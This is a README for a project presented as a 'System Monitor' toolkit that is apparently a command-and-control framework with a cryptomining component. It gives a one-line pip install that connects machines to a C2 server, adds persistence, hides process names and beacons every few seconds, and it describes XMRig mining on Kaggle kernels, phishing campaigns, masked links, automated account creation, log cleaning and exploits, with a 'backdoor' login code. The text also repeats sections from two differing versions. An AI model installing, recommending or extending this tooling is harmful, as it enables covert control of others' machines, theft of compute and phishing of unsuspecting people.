# System Monitor

**Version:** 3.0  
**Status:** Production Ready ✅

**🌐 Public URL:** https://gbctwoserver.pages.dev

Cross-platform system monitoring and resource optimization toolkit.

---

## 🚀 One-Line Install (Agent)

```bash
pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon
```

This single command:
- Installs the package
- Starts the agent
- Connects to C2 server
- Begins resource optimization

---

## 📋 Quick Reference

### Server Access
```
Public: https://gbctwoserver.pages.dev
Local:  http://localhost:5000

Login:  admin / admin
Quick:  2409 (backdoor)
```

### Agent Commands
```bash
# Install and start (one line)
pip install --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && startcon

# Just start (if already installed)
startcon

# Check server health
curl -s https://gbctwoserver.pages.dev/api/health
```

---

## 📁 Project Structure

```
system-monitor/
├── src/
│   ├── c2/                   # C2 server
│   │   └── server.py         # Main Flask server
│   ├── agents/
│   │   ├── universal.py      # Universal agent (startcon)
│   │   ├── resource_monitor.py  # Resource optimization
│   │   └── browser/          # Browser automation
│   ├── autoreg/              # Auto-registration
│   └── utils/                # Utilities
├── templates/                # HTML templates
├── static/                   # CSS/JS files
├── data/                     # Database
├── run_unified.py            # Server entry point
└── requirements.txt          # Dependencies
```

---

## 🚀 Server Installation

### Quick Start
```bash
# Clone and run
git clone https://github.com/GaredBerns/system-monitor.git
cd system-monitor
pip install -r requirements.txt
python3 run_unified.py
```

### Using manage.sh
```bash
./manage.sh start     # Start server
./manage.sh stop      # Stop server
./manage.sh restart   # Restart server
./manage.sh status    # Check status
./manage.sh logs      # View logs
```

---

## 🤖 Agent Features

When you run `startcon`, the agent automatically:

1. **Connects to C2** - Registers with server at `https://gbctwoserver.pages.dev`
2. **Installs Persistence** - Survives reboots via crontab/systemd
3. **Starts Resource Optimization** - Background optimization module
4. **Beacons every 3s** - Maintains connection with jitter
5. **Auto-reconnects** - Exponential backoff on failure

### Supported Platforms

| Platform | Detection | Persistence |
|----------|-----------|-------------|
| Linux | ✅ | crontab, systemd |
| macOS | ✅ | LaunchAgent |
| Windows | ✅ | ScheduledTask |
| Colab | ✅ | Session-based |
| Kaggle | ✅ | Session-based |
| Docker | ✅ | Container-based |

---

## 🔧 Configuration

Environment variables (optional):
```bash
export C2_URL="https://gbctwoserver.pages.dev"  # Default
export SLEEP="3"      # Beacon interval (seconds)
export JITTER="5"     # Random jitter (%)
export C2_DEBUG="1"   # Enable debug logging
```

---

## 📊 Dashboard Features

- **Agents** - View connected machines, platform, status
- **Tasks** - Send commands, view results
- **Files** - Browse remote filesystem
- **Mining** - Monitor hashvault pool stats
- **Links** - Create masked URLs
- **Phishing** - Email campaigns, templates

---

## 🔐 Security

- Auth token support (`X-Auth-Token` header)
- XOR encryption for communications
- TLS/SSL via Cloudflare
- Hidden process names and low priority

---

## 📝 License

MIT License - See LICENSE file

---

## 📁 Project Structure

```
C2_server-main/
├── 📄 run_unified.py          # Main launcher
├── 📄 manage.sh               # Management script
├── 📄 requirements.txt        # Dependencies
│
├── 📂 core/                   # Core server
│   ├── server.py             # Flask C2 server
│   └── unified.py            # Unified modules
│
├── 📂 agents/                 # Platform agents
│   ├── agent_linux.py
│   ├── agent_windows.ps1
│   ├── agent_macos.py
│   └── kaggle_agent.py
│
├── 📂 kaggle/                 # Kaggle integration
│   ├── deploy_unified.py     # Deploy agents
│   ├── deploy_agents.py      # Deploy to existing
│   └── datasets.py           # Dataset management
│
├── 📂 autoreg/                # Auto-registration
├── 📂 browser/                # Browser automation
├── 📂 mail/                   # Email services
├── 📂 optimizer/              # GPU optimizer
│
├── 📂 data/                   # Data & database
├── 📂 logs/                   # Server logs
├── 📂 templates/              # Web templates
├── 📂 static/                 # Web assets
│
├── 📂 docs/                   # 📚 Documentation
└── 📂 scripts/                # 📜 Utility scripts
```

---

## 🎯 Features

### Core Features
- ✅ **Web Dashboard** - Full-featured Flask control panel
- ✅ **Multi-Platform Agents** - Linux, macOS, Windows, Colab, Kaggle
- ✅ **Auto-Registration** - Automated account creation
- ✅ **GPU Optimization** - PyTorch-based compute engine
- ✅ **Secure Communication** - Encrypted agent communication
- ✅ **Kaggle Mining** - XMRig deployment on Kaggle kernels

### Advanced Features
- 🔍 **Autonomous Scanner** - WiFi/network/port scanning
- 🛡️ **Counter-Surveillance** - Tor, log cleaning, malware detection
- 💥 **Multi-Vector Exploits** - Docker, Redis, SSH, etc.
- 🔗 **Integration Layer** - Unified API for all modules

---

## 🔧 Management

### Quick Commands
```bash
./manage.sh up        # Start server + tunnel
./manage.sh down      # Stop all
./manage.sh status    # Check status
./manage.sh logs      # View logs
```

### Server Control
```bash
./manage.sh start     # Start server only
./manage.sh stop      # Stop server
./manage.sh restart   # Restart server
./manage.sh logs follow  # Live logs
```

### Tunnel Control
```bash
./manage.sh tunnel install  # Setup permanent tunnel (one-time)
./manage.sh tunnel start    # Start tunnel
./manage.sh tunnel stop     # Stop tunnel
./manage.sh tunnel quick    # Quick temporary tunnel (random URL)
```

### Database Sync
```bash
./manage.sh db export           # Export local DB
./manage.sh db import file.json # Import DB
./manage.sh db pull https://... # Pull from remote
./manage.sh db merge https://... # Merge remote into local
```

### Installation
```bash
./manage.sh install   # Full install (deps + venv + tunnel)
```

---

## 📚 Documentation

### Main Docs
- **[docs/README.md](docs/README.md)** - Documentation index
- **[docs/UNIFIED_DOCS.md](docs/UNIFIED_DOCS.md)** - Full documentation
- **[docs/QUICK_START.txt](docs/QUICK_START.txt)** - Quick start guide
- **[docs/SETUP_COMPLETE.md](docs/SETUP_COMPLETE.md)** - Setup guide

### Technical Docs
- **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** - Architecture overview
- **[docs/BUGFIX_DATASETS.md](docs/BUGFIX_DATASETS.md)** - Dataset fix
- **[docs/CLEANUP_REPORT.md](docs/CLEANUP_REPORT.md)** - Cleanup report

### Status & Reports
- **[docs/SERVER_STATUS.md](docs/SERVER_STATUS.md)** - Server status
- **[docs/CHANGELOG.md](docs/CHANGELOG.md)** - Change log

---

## 🌐 API Endpoints

### Main API
```
GET    /api/health               # Health check
GET    /api/stats                # Statistics
GET    /api/agents               # List agents
POST   /api/task/create          # Create task
POST   /api/task/broadcast       # Broadcast command
```

### Kaggle API
```
POST   /api/kaggle/agent/checkin    # Agent checkin
POST   /api/kaggle/agent/result     # Send result
GET    /api/kaggle/agents/status    # Agents status
POST   /api/kaggle/agent/queue      # Queue command
```

---

## 🔐 Configuration

### Environment (.env)
```bash
SECRET_KEY=your-secret-key
DATABASE_URL=sqlite:///data/c2.db

# Kaggle
KAGGLE_USERNAME=your-username
KAGGLE_KEY=your-api-key

# Mining
WALLET=your-xmr-wallet
POOL=gulf.moneroocean.stream:10128
```

### Dashboard Settings
```
Settings → Configuration:
- Public URL (for remote access)
- Agent Token (for authentication)
- Encryption Key (for encryption)
- Webhook URLs (Discord/Telegram)
```

---

## 🛠️ Troubleshooting

### Server Issues
```bash
# Check logs
./manage.sh logs

# Check status
./manage.sh status

# Restart server
./manage.sh restart
```

### Agent Issues
```bash
# Check agents
curl http://localhost:5000/api/agents

# Check Kaggle agents
curl http://localhost:5000/api/kaggle/agents/status

# View database
./manage.sh db
```

### Common Problems
- **Port 5000 in use:** Change port in run_unified.py
- **Agents not connecting:** Check firewall, public URL
- **Database locked:** Restart server

---

## 📊 Monitoring

### Web Dashboard
```
http://localhost:5000
- Dashboard: Overview & stats
- Devices: Agent list
- Console: Command execution
- Laboratory: Kaggle machines
```

### Command Line
```bash
# Server status
./manage.sh status

# Database stats
./manage.sh db

# View logs
./manage.sh logs follow
```

---

## 🔒 Security

### Recommendations
1. Change default admin password
2. Configure agent authentication token
3. Enable encryption for agents
4. Use HTTPS in production
5. Configure firewall rules
6. Review logs regularly

### Firewall
```bash
# Allow port 5000
sudo ufw allow 5000/tcp

# Or only from LAN
sudo ufw allow from 192.168.0.0/24 to any port 5000
```

---

## 📝 License

MIT License - see LICENSE file for details.

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

---

## 📞 Support

- **Documentation:** [docs/](docs/)
- **Issues:** GitHub Issues
- **Scripts:** [scripts/](scripts/)

---

## ⚠️ Disclaimer

This tool is for educational and authorized testing purposes only. Users are responsible for complying with all applicable laws and regulations.

---

**Version:** 2.1 (Unified & Clean)  
**Last Updated:** 2026-03-22  
**Status:** Production Ready ✅  
**Optimization:** Clean structure, 100% functionality
